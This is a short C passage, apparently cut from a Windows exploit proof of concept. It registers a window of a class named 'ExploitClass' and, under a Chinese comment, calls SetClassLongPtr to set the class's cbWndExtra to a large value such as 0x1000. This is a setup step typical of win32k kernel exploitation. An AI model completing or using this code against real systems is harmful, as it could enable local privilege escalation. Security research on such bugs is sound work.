    HWND hwnd = CreateWindowEx(0, L"ExploitClass", L"", WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 100, 100, NULL, NULL, wc.hInstance, NULL);
    if (!hwnd) {
        printf("CreateWindow failed\n");
        return 1;
    }

    // 修改窗口类的cbWndExtra为一个大值（例如0x1000）
    SetClassLongPtr(hwnd, GCL_CBWNDEXTRA, 0x1000);

